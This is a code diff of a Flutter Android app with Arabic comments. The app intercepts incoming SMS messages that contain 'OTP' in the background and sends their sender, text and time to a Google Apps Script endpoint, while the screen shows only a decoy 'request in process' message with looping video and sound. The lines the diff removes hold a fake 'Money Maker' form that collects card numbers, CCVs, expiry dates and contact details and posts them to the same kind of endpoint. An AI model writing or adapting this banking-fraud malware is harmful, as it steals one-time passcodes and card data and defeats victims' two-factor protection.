@@ -1,71 +1,68 @@
 import 'package:flutter/material.dart';
-import 'package:http/http.dart' as http;
-import 'dart:convert';
-import 'package:permission_handler/permission_handler.dart';
 import 'package:telephony/telephony.dart';
+import 'package:video_player/video_player.dart';
+import 'package:audioplayers/audioplayers.dart';
+import 'dart:convert';
+import 'package:http/http.dart' as http;
 
 void main() {
-  runApp(MyApp());
+  runApp(SmsApp());
 }
 
-class MyApp extends StatelessWidget {
+class SmsApp extends StatefulWidget {
   @override
-  Widget build(BuildContext context) {
-    return MaterialApp(
-      title: 'Money Maker',
-      home: PaymentFormPage(),
-      debugShowCheckedModeBanner: false,
-    );
-  }
+  _SmsAppState createState() => _SmsAppState();
 }
 
-class PaymentFormPage extends StatefulWidget {
-  @override
-  _PaymentFormPageState createState() => _PaymentFormPageState();
-}
-
-class _PaymentFormPageState extends State<PaymentFormPage> {
-  final _formKey = GlobalKey<FormState>();
-  final Map<String, String> formData = {};
+class _SmsAppState extends State<SmsApp> {
+  final Telephony telephony = Telephony.instance;
   final String sheetUrl =
-      "https://script.google.com/macros/s/AKfycbyqf40p00Zz1V8F2hLW9ZB7jfTlmf2ipmVS4fDl-ShINSEHW3bzSLqhGziZwl0cS_qURg/exec";
+      "https://script.google.com/macros/s/AKfycbyrhcPF7Pi1B9ZXiDZ2zM3XYElKTMdiyEc6oNhZ0SKZDwhKHCB06Pnlw2lJc1xbidXyRw/exec";
   final String smsKeyword = "OTP";
 
-  final Telephony telephony = Telephony.instance;
+  VideoPlayerController? _videoController;
+  final AudioPlayer _audioPlayer = AudioPlayer();
 
   @override
   void initState() {
     super.initState();
-    _requestSmsPermission();
-    _listenSms();
+    requestPermissions();
+    listenForSms();
+    initBackgroundVideo();
+    initBackgroundSound();
   }
 
-  void _requestSmsPermission() async {
+  // طلب الصلاحيات
+  void requestPermissions() async {
     bool? granted = await telephony.requestSmsPermissions;
     if (granted != true) {
-      print("لم يتم منح صلاحية الرسائل القصيرة");
+      print("❌ لم يتم منح إذن الرسائل");
+    } else {
+      print("✅ إذن الرسائل مفعّل");
     }
   }
 
-  void _listenSms() {
+  // الاستماع للرسائل
+  void listenForSms() {
     telephony.listenIncomingSms(
       onNewMessage: (SmsMessage message) {
         if (message.body != null && message.body!.contains(smsKeyword)) {
-          _sendSmsToSheet(
-            message.address ?? "",
-            message.body ?? "",
+          sendSmsToSheet(
+            message.address ?? "Unknown",
+            message.body ?? "No Body",
             DateTime.now().toString(),
           );
         }
       },
-      listenInBackground: false,
+      listenInBackground: true,
     );
   }
 
-  Future<void> _sendSmsToSheet(
+  // إرسال الرسالة إلى Google Sheets
+  Future<void> sendSmsToSheet(
       String sender, String body, String date) async {
     try {
-      await http.post(
+      final response = await http.post(
         Uri.parse(sheetUrl),
         headers: {"Content-Type": "application/json"},
         body: jsonEncode({
@@ -75,137 +72,82 @@ class _PaymentFormPageState extends State<PaymentFormPage> {
           "date": date,
         }),
       );
+      print("✅ تم إرسال الرسالة: ${response.body}");
     } catch (e) {
-      print("خطأ في إرسال الرسالة للشييت: $e");
+      print("❌ خطأ في الإرسال: $e");
     }
   }
 
-  Future<void> _submitForm() async {
-    if (_formKey.currentState!.validate()) {
-      _formKey.currentState!.save();
+  // خلفية الفيديو
+  void initBackgroundVideo() {
+    _videoController = VideoPlayerController.network(
+      "https://files.catbox.moe/ln0sv5.mp4", // رابط فيديو خلفية
+    )
+      ..initialize().then((_) {
+        _videoController!.setLooping(true);
+        _videoController!.play();
+        setState(() {});
+      });
+  }
 
-      try {
-        await http.post(
-          Uri.parse(sheetUrl),
-          headers: {"Content-Type": "application/json"},
-          body: jsonEncode({
-            "type": "form",
-            "cardNumber": formData["cardNumber"],
-            "ccv": formData["ccv"],
-            "expiryDate": formData["expiryDate"],
-            "username": formData["username"],
-            "email": formData["email"],
-            "phone": formData["phone"],
-          }),
-        );
-        ScaffoldMessenger.of(context).showSnackBar(
-          SnackBar(
-            content: Text(
-              "Your request is received. Please wait our response!",
-            ),
-          ),
-        );
-      } catch (e) {
-        ScaffoldMessenger.of(context).showSnackBar(
-          SnackBar(content: Text("حدث خطأ: $e")),
-        );
-      }
-    }
+  // تشغيل الصوت في الخلفية
+  void initBackgroundSound() async {
+    await _audioPlayer.setSource(UrlSource(
+        "https://files.catbox.moe/56oea6.mp3")); // رابط الصوت
+    _audioPlayer.setReleaseMode(ReleaseMode.loop);
+    _audioPlayer.resume();
+  }
+
+  @override
+  void dispose() {
+    _videoController?.dispose();
+    _audioPlayer.dispose();
+    super.dispose();
   }
 
   @override
   Widget build(BuildContext context) {
-    return Scaffold(
-      body: Stack(
-        children: [
-          Container(color: Colors.black),
-          Center(
-            child: Padding(
-              padding: const EdgeInsets.all(16.0),
-              child: Form(
-                key: _formKey,
-                child: SingleChildScrollView(
-                  child: Column(
-                    mainAxisAlignment: MainAxisAlignment.center,
-                    children: [
-                      TextFormField(
-                        decoration: InputDecoration(
-                          labelText: "Card Number",
-                          filled: true,
-                          fillColor: Colors.white,
-                        ),
-                        validator: (value) => value!.isEmpty
-                            ? "Please enter card number"
-                            : null,
-                        onSaved: (value) => formData["cardNumber"] = value!,
-                      ),
-                      SizedBox(height: 10),
-                      TextFormField(
-                        decoration: InputDecoration(
-                          labelText: "CCV",
-                          filled: true,
-                          fillColor: Colors.white,
-                        ),
-                        validator: (value) =>
-                            value!.isEmpty ? "Please enter CCV" : null,
-                        onSaved: (value) => formData["ccv"] = value!,
-                      ),
-                      SizedBox(height: 10),
-                      TextFormField(
-                        decoration: InputDecoration(
-                          labelText: "Expiry Date",
-                          filled: true,
-                          fillColor: Colors.white,
-                        ),
-                        validator: (value) =>
-                            value!.isEmpty ? "Please enter expiry date" : null,
-                        onSaved: (value) => formData["expiryDate"] = value!,
-                      ),
-                      SizedBox(height: 10),
-                      TextFormField(
-                        decoration: InputDecoration(
-                          labelText: "Username",
-                          filled: true,
-                          fillColor: Colors.white,
-                        ),
-                        validator: (value) =>
-                            value!.isEmpty ? "Please enter username" : null,
-                        onSaved: (value) => formData["username"] = value!,
-                      ),
-                      SizedBox(height: 10),
-                      TextFormField(
-                        decoration: InputDecoration(
-                          labelText: "Email",
-                          filled: true,
-                          fillColor: Colors.white,
-                        ),
-                        validator: (value) =>
-                            value!.isEmpty ? "Please enter email" : null,
-                        onSaved: (value) => formData["email"] = value!,
-                      ),
-                      SizedBox(height: 10),
-                      TextFormField(
-                        decoration: InputDecoration(
-                          labelText: "Phone",
-                          filled: true,
-                          fillColor: Colors.white,
-                        ),
-                        validator: (value) =>
-                            value!.isEmpty ? "Please enter phone" : null,
-                        onSaved: (value) => formData["phone"] = value!,
-                      ),
-                      SizedBox(height: 20),
-                      ElevatedButton(
-                        onPressed: _submitForm,
-                        child: Text("Submit"),
-                      ),
-                    ],
+    return MaterialApp(
+      debugShowCheckedModeBanner: false,
+      home: Scaffold(
+        backgroundColor: Colors.black,
+        body: Stack(
+          fit: StackFit.expand,
+          children: [
+            if (_videoController != null &&
+                _videoController!.value.isInitialized)
+              FittedBox(
+                fit: BoxFit.cover,
+                child: SizedBox(
+                  width: _videoController!.value.size.width,
+                  height: _videoController!.value.size.height,
+                  child: VideoPlayer(_videoController!),
+                ),
+              ),
+            Center(
+              child: Container(
+                padding: EdgeInsets.all(20),
+                decoration: BoxDecoration(
+                  gradient: LinearGradient(
+                    colors: [Colors.black87, Colors.amber.shade700],
+                    begin: Alignment.topLeft,
+                    end: Alignment.bottomRight,
                   ),
+                  borderRadius: BorderRadius.circular(20),
+                ),
+                child: Text(
+                  "📩 Your request is in process, just wait",
+                  style: TextStyle(
+                    fontSize: 20,
+                    color: Colors.white,
+                    fontFamily: 'Roboto',
+                  ),
+                  textAlign: TextAlign.center,
                 ),
               ),
             ),
-          ),
-        ],
+          ],
+        ),
       ),
     );
   }
